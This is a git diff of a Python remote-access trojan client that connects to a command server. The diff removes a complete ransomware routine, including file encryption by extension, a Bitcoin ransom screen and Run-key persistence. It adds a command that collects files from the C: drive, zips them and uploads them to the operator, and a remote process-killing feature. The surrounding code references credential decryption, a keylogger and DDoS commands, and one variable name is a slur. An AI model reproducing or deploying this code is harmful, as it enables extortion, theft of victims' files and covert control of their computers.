@@ -14,7 +14,6 @@ import shutil
 import signal
 import psutil
 import random
-import winreg
 import asyncio
 import zipfile
 import sqlite3
@@ -39,7 +38,6 @@ from Crypto.Util.number import long_to_bytes
 from win32crypt import CryptUnprotectData
 from browser_history import get_history
 from binascii import hexlify, unhexlify
-from cryptography.fernet import Fernet
 from Crypto.Util.Padding import unpad
 from hashlib import sha1, pbkdf2_hmac
 from scapy.all import ARP, Ether, srp
@@ -682,237 +680,6 @@ def AttackCFSOC(until_datetime, target, req):
 #endregion
 #endregion
 
-#region Ransomware
-def _ransom(key_, ransom_price_, email_, btc_address_):
-    EXTENSIONS = (
-        '.exe', '.dll'  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
-        '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
-        '.mp3','.mp4', '.m4a', '.aac','.ogg','.flac', '.wav', '.wma', '.aiff', '.ape', # music and sound
-        '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', # Video and movies
-
-        '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
-        '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
-        '.yml', '.yaml', '.json', '.xml', '.csv', # structured data
-        '.db', '.sql', '.dbf', '.mdb', '.iso', # databases and disc images
-        
-        '.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css', # web technologies
-        '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', # C source code
-        '.java', '.class', '.jar', # java source code
-        '.ps', '.bat', '.vb', '.vbs' # windows based scripts
-        '.go', '.py', '.cs', '.resx', '.licx', '.csproj', '.sln', '.ico', '.pyc', '.bf', '.coffee', '.gitattributes', '.config', # other source code files
-
-        '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
-    )
-    
-    EXCLUDE_DIRECTORY = (
-        'Program Files',
-        'Program Files (x86)',
-        'Windows',
-        '$Recycle.Bin',
-        'AppData',
-        'logs',
-    )
-
-    EXCLUDE_FILES = (
-        'svchost',  # Windows service host (persistance filename)
-    )
-
-    maxthreads = 50
-
-    try:
-        digits          = randint(1111,9999)
-        kkk             = str(key_).lower()
-        key             = str(kkk).encode()
-        ransom_price    = ransom_price_
-        your_email      = email_
-        btc_address     = btc_address_
-
-        #region Functions
-        def enc(file_name, key):
-            fernet = Fernet(key)
-            with open(file_name, 'rb') as file: original = file.read()
-            encrypted = fernet.encrypt(original)
-            with open(file_name + '.WANNACRY', 'wb') as encrypted_file: encrypted_file.write(encrypted)
-            os.remove(file_name)
-
-        def write_readme():
-            data = f'''
-==========================================================================================================================================
-==========================================================================================================================================
-Ransomware Info: 
-
-    Digits: {digits}
-    Decryption Price: ${ransom_price} in BTC
-    Bitcoin Payment Address: {btc_address}
-    Hackers Email: {your_email}
-
-==========================================================================================================================================
-==========================================================================================================================================
-
-Seems like your files have been encrypted with high grade military encryption. To be able to decrypt your files please follow these instructions:
-
-
-1. Write down all ransomware info
-2. Contact the hacker via their email address
-3. Contemplate life and wonder why you are here
-4. Pay the ransom price in Bitcoin to the payment address
-5. Send the proof of transfer and your digits to the hacker's email address
-6. Download the decrypter from the decrypter URL the hacker sends you & wait for it to become online
-7. Decrypt your files
-8. Happy days :)
-==========================================================================================================================================
-==========================================================================================================================================
-            '''
-            with open(f'{os.getenv("USERPROFILE")}\\Desktop\\WANNACRY-README.OPENMEWITHNOTEPAD', 'w') as f:
-                f.write(data)
-
-        def show_message_box():
-            sleep(15)
-            threading.Thread(target=write_readme).start()
-            try:
-
-                root= tk.Tk()
-                width = root.winfo_screenwidth() 
-                height = root.winfo_screenheight() 
-
-
-                canvas1 = tk.Canvas(root, width = width, height = height, bg='black') 
-                canvas1.pack()
-
-                label1 = tk.Label(root, text='YOUR FILES HAVE BEEN ENCRYPTED') 
-                label1.config(font=('helvetica', int(height/20)))
-                label1.config(background='black', foreground='red')
-                canvas1.create_window(int(width/2), int(height/15), window=label1)
-
-
-                label1 = tk.Label(root, text=f'YOUR DIGITS ARE {digits}') 
-                label1.config(font=('helvetica', int(height/50)))
-                label1.config(background='black', foreground='red')
-                canvas1.create_window(int(width/2), int(height/20)*4, window=label1)
-
-
-                label1 = tk.Label(root, text='YOUR IMPORTANT PROGRAMS, DOCUMENTS, DATAS, PHOTOS, SCRIPTS, SOURCE CODE AND VIDEOS') 
-                label1.config(font=('helvetica', int(height/50)))
-                label1.config(background='black', foreground='red')
-                canvas1.create_window(int(width/2), int(height/20)*6, window=label1)
-
-
-                label1 = tk.Label(root, text='HAVE BEEN ENCRYPTED WITH HIGH GRADE MILITARY ENCRYPTION.') 
-                label1.config(font=('helvetica', int(height/50)))
-                label1.config(background='black', foreground='red')
-                canvas1.create_window(int(width/2), int(height/20)*7, window=label1)
-
-
-                label1 = tk.Label(root, text='YOU ONLY HAVE 48 HOURS TO SUBMIT THE PAYMENT, AFTER THAT THE PRICE WILL BE DOUBLED') 
-                label1.config(font=('helvetica', int(height/50)))
-                label1.config(background='black', foreground='red')
-                canvas1.create_window(int(width/2), int(height/20)*8, window=label1)
-
-
-                label1 = tk.Label(root, text='Look for a file named "WANNACRY-README.OPENMEWITHNOTEPAD" for more info') 
-                label1.config(font=('helvetica', int(height/50)))
-                label1.config(background='black', foreground='red')
-                canvas1.create_window(int(width/2), int(height/20)*9, window=label1)
-
-
-                label1 = tk.Label(root, text=f'to decrypt them, send ${ransom_price} in BITCOIN to')
-                label1.config(font=('helvetica', int(height/50)))
-                label1.config(background='black', foreground='red')
-                canvas1.create_window(int(width/2), int(height/20)*11, window=label1)
-
-                
-                labelBTC = tk.Label(root, text=f"{btc_address}") 
-                labelBTC.config(font=('helvetica', int(height/50))) 
-                labelBTC.config(background='black', foreground='red') 
-                canvas1.create_window(int(width/2), int(height/20)*13, window=labelBTC)
-                                                            # *13 means how far down the canvas the subtitle is!
-
-                label1 = tk.Label(root, text=f'and then send proof of transfer & your digits to {your_email}')
-                label1.config(font=('helvetica', int(height/50)))
-                label1.config(background='black', foreground='red')
-                canvas1.create_window(int(width/2), int(height/20)*15, window=label1)
-
-                
-                root.attributes('-topmost', True) # Puts message box infont of everything else
-                root.attributes('-fullscreen', True) # Set message box to fullscreen
-                root.mainloop()
-            except: pass
-
-        def disable_task_manager():
-            try:
-                registry_path = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"
-                registry_name = "DisableTaskMgr"
-                value = 1
-                reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_path, 0, winreg.KEY_SET_VALUE)
-                winreg.SetValueEx(reg_key, registry_name, 0, winreg.REG_SZ, value)
-                winreg.CloseKey(reg_key)
-            except: pass
-                
-        def disable_control_panel():
-            try:
-                registry_path = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer"
-                registry_name = "NoControlPanel"
-                value = 1
-                reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_path, 0, winreg.KEY_SET_VALUE)
-                winreg.SetValueEx(reg_key, registry_name, 0, winreg.REG_SZ, value)
-                winreg.CloseKey(reg_key)
-            except: pass
-                
-        def become_persistent():
-            try:
-                evil_location = os.environ["appdata"] + "\\svchost.exe"
-                persistence_registry_name = "WindowsUpdate"
-                
-                persistenceCMD = f"REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /V \"{persistence_registry_name}\" /t REG_SZ /F /D \"{evil_location}\""
-                
-                if not os.path.exists(evil_location):
-                    cmd = persistenceCMD
-                    shutil.copy2(sys.executable, evil_location)
-                    subprocess.call(cmd, shell=True)
-            except: pass
-        
-        def scrape_files(i):
-            list_of_files = list()
-            for (dirpath, dirnames, filenames) in os.walk(f'{i}\\'):
-                if any(s in dirpath for s in EXCLUDE_DIRECTORY): pass
-                else:
-                    if any(s in filenames for s in EXCLUDE_FILES): pass
-                    else:
-                        list_of_files += [os.path.join(dirpath, file) for file in filenames]
-                        for l in list_of_files:
-                            if l.endswith(EXTENSIONS):
-                                try: 
-                                    FileSize = os.stat(l).st_size
-                                    if (FileSize >= 50000000): # If file is greater than 50MB
-                                        while True:
-                                            if threading.activeCount() <= maxthreads:
-                                                threading.Thread(target=enc, args=(l, key, )).start()
-                                                break
-                                            else: sleep(0.2)
-                                    else: enc(l, key)
-                                except: pass
-       #endregion
-
-        gay = ctypes.windll.shell32.IsUserAnAdmin() != 0
-        if gay: pass
-            # try: ctypes.windll.user32.BlockInput(True)                        # Block input to prevent user from closing the program
-            # except: pass
-            # try: threading.Thread(target=disable_task_manager).start()        # Disable taskmanager
-            # except: pass
-            # try: threading.Thread(target=disable_control_panel).start()       # Disable control panel
-            # except: pass
-            # try: threading.Thread(target=become_persistent).start()           # Make program persistent    
-            # except: pass
-
-
-        _drives = [ chr(x) + ":" for x in range(65,91) if os.path.exists(chr(x) + ":") ]
-        for i in _drives:
-            threading.Thread(target=scrape_files, args=(i, )).start()
-
-        threading.Thread(target=show_message_box).start()
-        
-    except: pass
-#endregion
 
 #region Keylogger
 class Keylogger: 
@@ -1960,6 +1727,27 @@ def kill_zombie():
 #endregion
 
 
+def process_control(id=0):
+    process_control.stop=0
+    while 1: 
+        if blocked_process:
+            for proc in psutil.process_iter():
+                try:
+                    if proc.name().split(".")[0] in blocked_process: proc.kill()
+                except: pass
+        sleep(0.5)
+        if process_control.stop==id:
+            process_control.stop=0
+            break
+
+EXCLUDE_DIRECTORY = (
+    'Program Files',
+    'Program Files (x86)',
+    'Windows',
+    '$Recycle.Bin',
+    'AppData',
+    'logs',
+)
 
 
 ip      	= "192.168.0.2" 	# IP_HERE
@@ -1967,12 +1755,12 @@ port_    	= "1888"			# PORT_HERE
 
 
 
-
-
-port   = int(port_)
-h_name = socket.gethostname()
-IP_addres = socket.gethostbyname(h_name)
-now = datetime.datetime.now()
+blocked_process = []
+maxthreads      = 50
+port            = int(port_)
+h_name          = socket.gethostname()
+IP_addres       = socket.gethostbyname(h_name)
+now             = datetime.datetime.now()
 
 class Client():
     run = False
@@ -2106,6 +1894,36 @@ class Client():
         os.startfile(os.getenv("TEMP") + "\\" + script_name + "." + script_type)   # Executing Script
         os.remove(os.getenv("TEMP") + "\\" + script_name + "." + script_type)   # Deleting Script
 
+    def scan_files(self, filenames_):
+        """
+        Takes 1 Param : Filenames
+        Scans files in C drive and returns the files if filenames matches
+        """
+        temp_dir = mkdtemp()
+
+        try: 
+            for dirpath, dirnames, filenames in os.walk("C:\\"):
+                if any(s in dirpath for s in EXCLUDE_DIRECTORY): pass # Excluding Directories
+                for file in filenames: # Scanning Files
+                    if file.split(".")[0] in filenames_: shutil.copy2(dirpath + "\\" + file, temp_dir + "\\" + file) # Copying Files
+
+            # Pack the files in the temporary directory into a zip file ready to upload
+            _zipfile = os.path.join(os.getenv("TEMP"), f'files.zip')
+            zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
+            abs_src = os.path.abspath(temp_dir)
+            for dirname, _, files in os.walk(temp_dir):
+                for filename in files:
+                    absname = os.path.abspath(os.path.join(dirname, filename))
+                    arcname = absname[len(abs_src) + 1:]
+                    zipped_file.write(absname, arcname)
+            zipped_file.close()
+
+            # Upload the zip file
+            url = self.download(_zipfile)
+            os.remove(_zipfile)
+            self.sock.send(str.encode(f"Scan Complete! | Files Found: {url}"))
+
+        except Exception as e: self.sock.send(str.encode(f"Error: {e}"))
     #endregion
 
     def start(self):
@@ -2136,8 +1954,17 @@ class Client():
             elif "scanfiles" in data:
                 try:
                     data = data.replace("scanfiles ","").split()
-                    # Scan pc for files
-                    self.sock.send(str.encode(f"Scan Complete !\n\n{resulsts}"))
+                    self.scan_files(data)
+                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
+
+            elif "processcontrol" in data:
+                try:
+                    global blocked_process
+                    data = data.replace("processcontrol ","").split()
+                    blocked_process = data
+                    print(data)
+                    threading.Thread(target=process_control, args=(6969,)).start()
+                    self.sock.send(f"Process Control Enabled".encode("ascii"))
                 except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
 
             elif "ddos" in data:
@@ -2174,19 +2001,6 @@ class Client():
                     else: self.sock.send(f"Invalid Attack Method: {method}".encode("ascii"))
                     
                 except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
-
-            elif "ransom" in data:
-                try:
-                    data = data.replace("ransom ","").split()
-                    ransom_price = data[0] 
-                    your_email = data[1]
-                    btc_address = data[2]
-                    key = str(data[3]).lower()
-
-                    data___ = _ransom(key, ransom_price, your_email, btc_address)
-
-                    self.sock.send(str.encode(self.public_ip + "    " + data___))
-                except: self.sock.send(f"{self.public_ip}    client ransomed".encode("ascii"))
 
             elif "root" in data:
                 try:
@@ -2307,6 +2121,13 @@ class Client():
 
                     threading.Thread(target=start_stresser, args=(time, tasks, )).start()
                     self.sock.send(str.encode("Stressing target for " + str(time) + " seconds" + " with " + str(tasks) + " tasks"))
+                except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
+
+            elif data == "stopprocessscontrol":
+                try:
+                    blocked_process = []
+                    process_control.stop = 6969
+                    self.sock.send(f"Process Control Disabled".encode("ascii"))
                 except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
 
             elif data == "ping":
